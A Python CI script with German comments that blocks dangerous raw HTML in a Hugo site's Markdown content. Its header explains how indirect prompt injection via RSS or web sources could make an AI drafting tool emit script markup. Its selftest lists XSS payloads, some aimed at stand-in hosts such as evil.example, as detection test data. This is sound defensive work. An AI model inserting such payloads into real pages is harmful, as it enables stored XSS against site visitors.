#!/usr/bin/env python3
# ============================================================
#  ROH-HTML-GATE – kein Skript, kein iframe, kein Event-Handler im Inhalt
#
#  Sicherheitsaudit 14.10.2026 (M-06): hugo.toml setzt
#  `markup.goldmark.renderer.unsafe = true`. Damit landet JEDES HTML aus
#  Markdown ungefiltert auf der Website – auch aus KI-Entwürfen, die aus
#  RSS-/Web-Recherchen gespeist werden (indirekte Prompt-Injection: ein
#  präparierter Quelltext bringt das Modell dazu, `<script>` oder
#  `<img onerror=…>` auszugeben). Ein einziger solcher Artikel wäre
#  Stored XSS auf der eigenen Domain.
#
#  Das Gate prüft den Markdown-Rumpf aller Inhalte gegen eine ALLOWLIST:
#    · nur bekannte, harmlose Tags (div, span, table, img, a, …)
#    · keine Event-Handler (on…=), kein srcdoc/formaction
#    · URL-Attribute nur http(s), mailto, tel, relativ oder #Anker
#    · style-Attribute ohne expression(), url(javascript:), @import
#  Codeblöcke, Inline-Code, HTML-Kommentare und Hugo-Shortcodes
#  ({{< … >}}, {{% … %}}) werden vorher entfernt.
#
#  Modi:
#    --gate         Exit 1, wenn ein veröffentlichter Inhalt (draft != true)
#                   einen Fund hat (fail-closed).
#    --quarantaene  Veröffentlichte ARTIKEL (content/posts/) mit Fund werden
#                   einzeln auf `draft: true` gesetzt, mit Grund im
#                   Frontmatter (`quarantaene:`) – die übrige Auslieferung
#                   läuft weiter. Seiten außerhalb von posts/ (Impressum,
#                   Datenschutz …) werden NIE automatisch zurückgezogen;
#                   für sie bleibt das Gate rot, bis ein Mensch entscheidet.
#    --report       Funde auflisten (Standard).
#    --selftest     Eingefrorene Positiv-/Negativfälle (Exit 2 bei Abweichung).
#
#  Mittelfristig: `unsafe = false` und die wenigen echten HTML-Bausteine als
#  Shortcodes – dann wird dieses Gate zur zweiten Verteidigungslinie.
# ============================================================
from __future__ import annotations

import argparse
import re
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
CONTENT = ROOT / "content"

ERLAUBTE_TAGS = {
    "a", "abbr", "article", "aside", "b", "blockquote", "br", "caption", "cite",
    "code", "col", "colgroup", "dd", "del", "details", "dfn", "div", "dl", "dt",
    "em", "figcaption", "figure", "footer", "h1", "h2", "h3", "h4", "h5", "h6",
    "header", "hr", "i", "img", "input", "ins", "kbd", "label", "li", "mark",
    "nav", "ol", "p", "picture", "pre", "q", "s", "samp", "section", "small",
    "source", "span", "strong", "sub", "summary", "sup", "table", "tbody", "td",
    "tfoot", "th", "thead", "time", "tr", "u", "ul", "var", "wbr",
}
URL_ATTRIBUTE = {"href", "src", "srcset", "action", "formaction", "poster",
                 "cite", "background", "xlink:href", "data", "longdesc", "ping"}
VERBOTENE_ATTRIBUTE = {"srcdoc", "formaction", "form", "action"}
ERLAUBTE_SCHEMATA = ("http:", "https:", "mailto:", "tel:")
STYLE_GEFAHR = re.compile(r"expression\s*\(|javascript:|vbscript:|@import|behavior\s*:|-moz-binding|url\s*\(\s*['\"]?\s*(?:javascript|data):", re.I)
TAG = re.compile(r"<\s*(/?)\s*([A-Za-z][A-Za-z0-9:-]*)((?:\s[^<>]*?)?)\s*(/?)\s*>", re.S)
ATTR = re.compile(r"""([^\s"'<>/=]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>`]+)))?""")
STEUERZEICHEN = re.compile(r"[\x00-\x20\x7f]+")


def rumpf_und_kopf(text: str) -> tuple[str, str]:
    if text.startswith("---"):
        ende = text.find("\n---", 3)
        if ende > 0:
            return text[3:ende], text[ende + 4:]
    if text.startswith("+++"):
        ende = text.find("\n+++", 3)
        if ende > 0:
            return text[3:ende], text[ende + 4:]
    return "", text


def bereinigen(rumpf: str) -> str:
    t = re.sub(r"(?ms)^(\s*)(`{3,}|~{3,}).*?^\1\2[ \t]*$", "", rumpf)   # Codeblöcke
    t = re.sub(r"(?ms)^(\s*)(`{3,}|~{3,}).*\Z", "", t)                 # offener Codeblock bis Ende
    t = re.sub(r"`[^`\n]*`", "", t)                                       # Inline-Code
    t = re.sub(r"(?s)<!--.*?-->", "", t)                                  # Kommentare
    t = re.sub(r"(?s)\{\{[<%].*?[%>]\}\}", "", t)                         # Shortcodes
    return t


def url_ok(wert: str) -> bool:
    probe = STEUERZEICHEN.sub("", wert or "").lower()
    probe = re.sub(r"&#x?0*(58|3a);?", ":", probe)                     # &#58; / &#x3a; = ':'
    if re.match(r"^[a-z][a-z0-9+.\-]*:", probe):
        return probe.startswith(ERLAUBTE_SCHEMATA)
    return True


def pruefe_text(rumpf: str) -> list[str]:
    funde = []
    t = bereinigen(rumpf)
    for m in TAG.finditer(t):
        schliessend, name, attrs = m.group(1), m.group(2).lower(), m.group(3) or ""
        if ":" in name and not attrs.strip():
            continue  # Autolink <https://…> – prüft der Link-Hook (M-15)
        if "@" in m.group(0) and " " not in m.group(0).strip("<>"):
            continue  # E-Mail-Autolink
        if name not in ERLAUBTE_TAGS:
            funde.append(f"Tag <{name}> nicht erlaubt")
            continue
        if schliessend:
            continue
        for am in ATTR.finditer(attrs):
            an = am.group(1).lower()
            wert = next((g for g in am.groups()[1:] if g is not None), "")
            if an.startswith("on"):
                funde.append(f"<{name}>: Event-Handler {an}=")
            elif an in VERBOTENE_ATTRIBUTE:
                funde.append(f"<{name}>: Attribut {an}= verboten")
            elif an in URL_ATTRIBUTE and not url_ok(wert):
                funde.append(f"<{name}>: {an}= mit unzulässigem Schema")
            elif an == "srcset" and any(not url_ok(teil.strip().split(" ")[0]) for teil in wert.split(",")):
                funde.append(f"<{name}>: srcset mit unzulässigem Schema")
            elif an == "style" and STYLE_GEFAHR.search(STEUERZEICHEN.sub("", wert)):
                funde.append(f"<{name}>: gefährliches style=")
    # Markdown-Links/Bilder mit gefährlichem Schema (zweite Linie zum Link-Hook)
    for lm in re.finditer(r"!?\[[^\]]*\]\(\s*<?([^)\s>]+)", t):
        if not url_ok(lm.group(1)):
            funde.append("Markdown-Link mit unzulässigem Schema")
    return sorted(set(funde))


def ist_entwurf(kopf: str) -> bool:
    return re.search(r"(?m)^draft:\s*(true|yes|1)\s*$", kopf, re.I) is not None


def alle_inhalte(basis: Path = CONTENT):
    for p in sorted(basis.rglob("*.md")):
        try:
            text = p.read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError):
            continue
        kopf, rumpf = rumpf_und_kopf(text)
        yield p, text, kopf, rumpf


def quarantaene_setzen(text: str, grund: str) -> str:
    kopf_ende = text.find("\n---", 3)
    kopf = text[3:kopf_ende]
    grund = grund.replace('"', "'")[:180]
    if re.search(r"(?m)^draft:", kopf):
        kopf = re.sub(r"(?m)^draft:.*$", "draft: true", kopf, count=1)
    else:
        kopf = kopf.rstrip("\n") + "\ndraft: true\n"
    kopf = re.sub(r"(?m)^quarantaene:.*\n?", "", kopf)
    kopf = kopf.rstrip("\n") + f'\nquarantaene: "roh_html_gate: {grund}"\n'
    return "---" + kopf + text[kopf_ende:]


def lauf(modus: str, basis: Path = CONTENT, ausgabe=print) -> int:
    rot = 0
    for p, text, kopf, rumpf in alle_inhalte(basis):
        if ist_entwurf(kopf):
            continue
        funde = pruefe_text(rumpf)
        if not funde:
            continue
        rel = p.relative_to(basis.parent) if basis.parent in p.parents else p
        ist_artikel = "posts" in p.relative_to(basis).parts
        if modus == "quarantaene" and ist_artikel and text.startswith("---"):
            p.write_text(quarantaene_setzen(text, "; ".join(funde)), encoding="utf-8")
            ausgabe(f"::warning title=Roh-HTML-Quarantäne::{rel}: {'; '.join(funde)} – auf draft gesetzt.")
            continue
        rot += 1
        ausgabe(f"::error title=Roh-HTML-Gate::{rel}: {'; '.join(funde)}")
    if rot == 0:
        ausgabe("✅ Roh-HTML-Gate: keine gefährlichen HTML-Konstrukte in veröffentlichten Inhalten.")
    return 1 if (rot and modus in ("gate", "quarantaene")) else 0


def selbsttest() -> int:
    import tempfile
    boese = [
        "<script>alert(1)</script>", "<SCRIPT src=//x.example/a.js></SCRIPT>",
        "<img src=x onerror=alert(1)>", '<img src="x" ONERROR="alert(1)">',
        "<iframe src=https://evil.example></iframe>", '<a href="javascript:alert(1)">x</a>',
        '<a href="  JaVa\tScRiPt:alert(1)">x</a>', '<a href="java&#58;script:alert(1)">x</a>',
        '<a href="data:text/html,<script>alert(1)</script>">x</a>',
        "<svg onload=alert(1)>", "<object data=x.swf></object>", "<embed src=x>",
        '<div style="background:url(javascript:alert(1))">x</div>',
        '<meta http-equiv="refresh" content="0;url=https://evil.example">',
        "<base href=https://evil.example/>", "<form action=https://evil.example><input></form>",
        '<input type="image" formaction="https://evil.example">', "<style>@import url(x)</style>",
        "[klick](javascript:alert(1))", "<details open ontoggle=alert(1)>",
    ]
    gut = [
        '<div class="ff-box"><span>Text</span></div>', "<br>", "<br/>",
        '<a href="/posts/x/" rel="nofollow sponsored" target="_blank">x</a>',
        '<a href="https://example.com/?a=1&b=2">x</a>', '<a href="mailto:a@b.de">Mail</a>',
        '<img src="/images/a.webp" alt="A" width="10" height="10" loading="lazy">',
        '<input type="checkbox" id="c1"><label for="c1">Punkt</label>',
        '<table><thead><tr><th>A</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>',
        "```html\n<script>alert(1)</script>\n```", "`<script>`",
        "<!-- <script>alert(1)</script> -->", '{{< werkzeug typ="rechner" >}}',
        "<https://example.com>", "<frank@example.com>", "[Link](/posts/x/)",
        '<span style="color: #333; font-weight: 600">x</span>', "Preis < 5 € und > 3 €",
    ]
    fehler = [f"NICHT erkannt: {b!r}" for b in boese if not pruefe_text(b)]
    fehler += [f"FEHLALARM: {g!r} -> {pruefe_text(g)}" for g in gut if pruefe_text(g)]
    with tempfile.TemporaryDirectory() as tmp:
        basis = Path(tmp) / "content"
        (basis / "posts" / "a").mkdir(parents=True)
        (basis / "impressum").mkdir(parents=True)
        (basis / "posts" / "a" / "index.md").write_text("---\ntitle: A\ndraft: false\n---\n<img src=x onerror=alert(1)>\n", encoding="utf-8")
        (basis / "impressum" / "index.md").write_text("---\ntitle: I\n---\n<script>x</script>\n", encoding="utf-8")
        (basis / "posts" / "b.md").write_text("---\ntitle: B\ndraft: true\n---\n<script>x</script>\n", encoding="utf-8")
        stumm = lambda *_: None
        if lauf("gate", basis, stumm) != 1:
            fehler.append("Gate nicht rot bei Fund")
        if lauf("quarantaene", basis, stumm) != 1:
            fehler.append("Quarantäne darf Seiten außerhalb posts/ nicht zurückziehen (Gate muss rot bleiben)")
        neu = (basis / "posts" / "a" / "index.md").read_text(encoding="utf-8")
        if "draft: true" not in neu or "quarantaene:" not in neu:
            fehler.append("Quarantäne hat den Artikel nicht auf draft gesetzt")
        if "<script>" not in (basis / "impressum" / "index.md").read_text(encoding="utf-8"):
            fehler.append("Impressum wurde verändert")
        (basis / "impressum" / "index.md").write_text("---\ntitle: I\n---\nok\n", encoding="utf-8")
        if lauf("gate", basis, stumm) != 0:
            fehler.append("Gate rot ohne Fund (Entwürfe/Quarantäne müssen ignoriert werden)")
    for f in fehler:
        print(f"❌ {f}")
    if fehler:
        return 2
    print(f"✅ Roh-HTML-Gate-Selbsttest: {len(boese)} Angriffe erkannt, {len(gut)} harmlose Fälle frei, Quarantäne korrekt.")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="Roh-HTML-Gate (Audit M-06)")
    g = ap.add_mutually_exclusive_group()
    g.add_argument("--gate", action="store_true")
    g.add_argument("--quarantaene", action="store_true")
    g.add_argument("--report", action="store_true")
    g.add_argument("--selftest", action="store_true")
    a = ap.parse_args(argv)
    if a.selftest:
        return selbsttest()
    if a.gate:
        return lauf("gate")
    if a.quarantaene:
        return lauf("quarantaene")
    return lauf("report")


if __name__ == "__main__":
    sys.exit(main())
